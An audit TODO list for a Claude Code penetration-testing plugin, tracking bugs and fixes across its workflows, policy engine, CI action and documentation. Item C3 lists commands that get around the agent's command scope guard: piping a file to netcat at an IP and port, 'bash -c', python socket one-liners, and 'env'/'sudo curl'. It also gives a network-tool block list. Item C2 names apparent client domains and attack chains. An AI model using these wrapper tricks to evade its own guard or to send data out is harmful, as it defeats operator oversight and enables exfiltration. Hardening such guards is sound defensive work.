# Quarry — Audit TODO

Consolidated from two independent reviews (Nov 2026).
Each item has a status: `[ ]` pending, `[x]` done, `[-]` won't fix (with reason).

---

## Critical — fix before anything else

### C1. YAML wildcard crashes full-pentest.yaml
- **File:** `workflows/full-pentest.yaml:64`
- **Bug:** `- *` is an invalid YAML alias; the loader crashes at runtime.
- **Mask:** `tests/validate_plugin.py:40-41,242,253` silently patches it with regex before parsing.
- **Fix:** Quote it as `- "*"`. Remove the regex workarounds from the validator. Promote YAML parse errors to hard failures.
- [x] Fix workflow YAML
- [x] Remove validator workarounds
- [ ] Add regression test: load all workflows with stdlib yaml.safe_load

### C2. Real client data in public repo
- **Files:** `commands/engage.md:15-16,36-42`, `commands/chain.md:36-37`
- **Data:** `amplifica.io`, `fazt.cl`, `portalnet_audit`, `amplifica_audit`, `fazt_audit`, Syncfonía F2+F7, Amplifica token-leak→ATO, Las Margaritas CVE-2024-28000+NF-nonce, `~/Dev/personal/<slug>_audit/` convention.
- **Risk:** Leaks client names and engagement patterns in an MIT repo headed for marketplace.
- **Fix:** Replace with `target.example.com`, `acme-corp_audit`, generic chain examples. Use `$QUARRY_AUDIT_DIR` or `~/.quarry/engagements/<slug>/` as convention.
- **Note:** Data already in git history — consider history rewrite or repo recreation before marketplace publish.
- [x] Sanitize engage.md
- [x] Sanitize chain.md
- [x] Rename Bountyforge in map.md (`commands/map.md:3`)
- [x] Sanitize chain-matrix.md, scope.md, chain_engine.py, design doc

### C3. Bash scope bypass in policy.py
- **File:** `engine/policy.py:113-125`
- **Bug:** `command_policy()` only inspects `argv[0]`. Wrappers bypass it:
  - `bash -c "nmap -sV target"` → allowed
  - `cat x | nc 10.0.0.5 4444` → allowed (pipeline)
  - `python3 -c "import socket..."` → allowed
  - `env curl https://outside.test` → allowed
  - `sudo curl https://outside.test` → allowed
- **Missing tools:** `ssh`, `openssl`, `socat`, `telnet`, `netcat`, `python3`, `python`, `node`, `ruby`, `perl`
- **Fix:**
  1. Tokenize the entire command and flag ANY token that is a network tool
  2. Unwrap `bash -c`, `sh -c`, `env`, `sudo`, `xargs` recursively
  3. Add `ssh`, `openssl`, `socat`, `telnet` to NETWORK_TOOLS
  4. Add `python3`, `python`, `node`, `ruby`, `perl`, `bash`, `sh` to a SHELL_WRAPPERS set that triggers deeper inspection
  5. Document in README that the guard is a tripwire, not a sandbox
  6. Add regression tests for all bypass patterns
- [x] Harden command_policy()
- [x] Add SHELL_WRAPPERS detection
- [x] Add missing tools to NETWORK_TOOLS
- [ ] Add regression tests

### C4. Artifacts are not actually immutable
- **File:** `engine/artifacts.py:51-67`
- **Bug:** `artifact_id` = `sha256(run_id:task_id:kind)[:20]`. Same combination → same ID → overwrite. The index filters out the old entry (line 66) and replaces it.
- **Repro:** Two captures with defaults `run_id="manual"`, `task_id="http"` → second overwrites first.
- **Fix:**
  1. Use UUID or ULID per capture (not content-derived)
  2. Include timestamp or counter in the path
  3. Never replace an existing artifact file
  4. Keep the content hash for integrity verification, not as identity
- [x] Fix artifact_id generation (UUID)
- [x] Make path unique per capture (timestamp + id suffix)
- [x] Refuse to overwrite existing artifacts
- [ ] Add regression test: two captures with same run/task/kind

### C5. Finding without evidence can be exported as validated
- **File:** `engine/findings.py:137-145,150-168`
- **Bug:** `FindingsStore.add()` accepts a Finding with `status="validated"` directly. `update_status()` allows transition to VALIDATED without checking for evidence, steps_to_reproduce, or evidence_tag.
- **Exporters** (`engine/exporters.py:29-36`) only check status, not evidence presence.
- **Fix:**
  1. New findings must start as `detected` (reject other statuses in `add()`)
  2. Transition to `validated` requires: `len(evidence) > 0`, `evidence_tag != "unproven"`, `len(steps_to_reproduce) >= 1`
  3. Exporters double-check evidence presence before including validated findings
- [x] Enforce initial status = detected in add()
- [x] Add evidence gate in update_status() for VALIDATED transition
- [x] Add exporter pre-check (filter findings without evidence)

### C6. GitHub Action can give green on failures
- **File:** `action.yml:45,57`
- **Bugs:**
  1. `|| true` on validator (line 45) and tests (line 57) — failures are swallowed
  2. `executionSuccessful: True` hardcoded (line 92)
  3. `continue-on-error: true` on SARIF upload (line 151)
  4. Validator emits `  ERROR:` (indented) but parser looks for `^ERROR:` — misses everything
  5. Tests emit `RESULTS: 0 failures` but parser looks for `N passed` — may always read 0
  6. SARIF generation wraps everything in bare except (lines 107-109)
- **Also:** Action runs self-check, not a scan of the target repo. README should say so.
- [x] Remove `|| true` from validator and test steps
- [x] Fix output parsers to match actual output format (`  ERROR:`, `  WARN:`)
- [x] Remove bare except in SARIF generation
- [x] Set executionSuccessful based on actual result
- [ ] Rename/document as "Quarry self-check" until real scanning is implemented

### C7. README install command doesn't exist + doctor doesn't check binaries
- **File:** `README.md:63,80-84`
- **Bugs:**
  1. `claude plugin add /path/to/quarry` is not a real Claude Code command
  2. README says doctor checks nmap/nuclei/ffuf/httpx but it only checks engagement integrity
- **Fix:**
  1. Correct install instructions
  2. Make doctor actually check binaries (tool_registry.py already has the data)
- [x] Fix README install instructions
- [x] Implement binary checks in doctor command (via ToolRegistry.probe)

---

## Important — fix next

### I1. Network paths outside common policy
- **Files:** `engine/browser_loop.py:93-101`, `engine/browser_verify.py:127-151`, `engine/mcp_client.py:116-137`
- **Bug:** Browser navigation and MCP calls bypass PolicyEngine scope checks. URL redirects and secondary requests are not validated.
- [x] Route browser URLs through scope validation (`browser_loop.navigate()`, `browser_verify` all probes)
- [ ] Add redirect interception
- [x] Validate MCP tool targets against scope (`mcp_client.call_tool()` extracts URLs from params, `_connect_http()` validates server URL)

### I2. Broken skill/workflow references (22+ warnings, 64+ hidden)
- **Missing skills referenced:** `gotchas`, `deliver`, `artifact-cleanup`, `credential-hygiene`, `evidence-seal`, `data-retention`, `target-diff` (is engine module, not skill), `param-discovery` (9 skills depend on it)
- **Stale references:** `auth-mapping` (should be `identity-map`?), `tech-fingerprint`/`subdomain-enum` (deleted)
- **Validator gap:** only checks workflows→skills, not skills→skills
- [x] Create or redirect missing skills (4 closeout skills created; `gotchas` removed from workflow refs; `deliver` changed to command ref; `target-diff` replaced with `active-recon` in retest.yaml)
- [x] Fix stale references (`auth-mapping`→`identity-map` 5 files, `tech-fingerprint`→`tech-stack-fingerprint` 3 files, `subdomain-enum`→`subdomain-discovery` 5 files, `cloud-asset-discovery`→`cloud-recon` 3 files, `param-discovery`→`fuzzing` 8 files, `app-profile`→`api-discovery` 2 files, `recon-asset-discovery`→`active-recon` 2 files, path-prefixed refs fixed)
- [x] Add skills→skills validation to validator (`check_skill_deps()` in `validate_plugin.py`)

### I3. Mixed language ES/EN
- **Status:** README/agents/skills in English; CLAUDE.md, 13/18 commands, all 14 workflows and templates in Spanish.
- **TODO-REVIEW says:** "All text in English (repo is public)"
- [x] Unify command descriptions (10 commands ES → EN)
- [x] Unify workflow descriptions (10 workflows + full-pentest phase descriptions)
- [x] Translate command body text (18 commands ES → EN)
- [ ] Translate workflow notes/comments (8 workflows still have Spanish in notes/body)

### I4. 10/18 agents not wired to any workflow
- **Unwired:** `engagement-planner`, `browser-verifier`, `ai-agent-exploit`, `network-analyst` (declares inputs nothing produces), 6 SAST agents
- **Bug:** `retest.yaml` assigns baseline phase to `monitor-agent` (read-only, tools: [Read])
- [ ] Wire agents to workflows or document as optional
- [ ] Fix retest.yaml agent assignment
- [ ] Remove or mark experimental agents that have no path to execution

### I5. Finding-checker blindness may be fictional
- `omitClaudeMd: true` / `isolation: blind` are not standard frontmatter keys
- If runtime ignores them, rebuttal "blind" review is prompt-only
- [ ] Verify in real session or implement via RebuttalEngine.get_checker_prompt()

### I6. Drift in vuln class counts
- hunt.md says 40, findings.md says 38, coverage.py defines 42, skills/hunt/ has 46
- [x] Remove hardcoded counts from commands (hunt.md, findings.md)

### I7. finding-validator.md uses CVSS 3.1 (plugin standard is 4.0)
- [x] Update to CVSS 4.0 as primary (finding-validator.md, seven-question-gate.md, finding-discipline SKILL.md, finding-template.md)

### I8. plugin.json missing mcpServers
- browser-verifier depends on 7 `mcp__Claude_Browser__*` tools
- [x] Add mcpServers.browser-verifier with 7 Claude Browser tools (marked optional)

### I9. Custody chain is locally tamper-evident, not attestable
- Anyone with write access can rewrite log and recalculate hashes
- [x] Update description to "locally tamper-evident" (README.md, CLAUDE.md, custody.py)
- [ ] Future: operator signature, external timestamping

### I10. Benchmark doesn't execute targets
- `.github/workflows/validate.yml:71-90` only runs synthetic scorer test and uploads existing results
- [ ] Implement real benchmark execution or update README claims

---

## Additions needed

- [ ] `argument-hint` in frontmatter of all 18 commands
- [ ] `SECURITY.md` (responsible disclosure policy)
- [ ] `CHANGELOG.md`, `CONTRIBUTING.md`
- [ ] Example session in README (DVWA transcript snippet)
- [x] Skill `param-discovery` redirected to `fuzzing` (8 files updated)
- [ ] Wire SAST pipeline to `pr-scan.yaml`
- [ ] Canonical verdict→FindingStatus mapping table
- [ ] Git tags + releases (currently 0.1.0 with no tags)
- [ ] `pyproject.toml` with dev deps, pytest config, ruff, type checking
- [ ] Smoke test: real Claude Code session (install, doctor, delegate, hooks)

---

## Removals / cleanup

- [ ] Archive or delete `TODO-REVIEW.md` (outdated: mentions missing README/LICENSE, wrong skill count)
- [ ] Remove absolute claims without methodology context ("No hallucinated vulns", "no other plugin", "100%")
- [x] Remove personal paths from engage.md examples (see C2)
- [x] Remove Bountyforge from map.md (see C2)
- [ ] Move experimental backends (Kali remote, anonlab, generic MCP) out of stable path until they share policy + have tests
- [ ] Consolidate rebuttal questions (3 copies: rebuttal.py, validate.md, finding-checker.md) → engine only
- [ ] Consolidate report definition (3 copies: report.md, report-writer.md, engagement-report.md) → single template
- [ ] Fix `cve-response.yaml` phases with only `notes:` (generates tasks toward non-existent skills)

---

## Recommended order

1. C1 (YAML wildcard) — 5 min, unblocks /quarry:run
2. C2 (client data) — urgent, repo is public
3. C3 (policy bypass) — security core
4. C4 (artifact immutability) — evidence integrity
5. C5 (finding evidence gate) — "no finding without proof" promise
6. C6 (action.yml) — CI trustworthiness
7. C7 (README + doctor) — first-run experience
8. I1-I2 (network paths + broken refs) — operational correctness
9. I3-I4 (language + unwired agents) — cleanup
10. Everything else
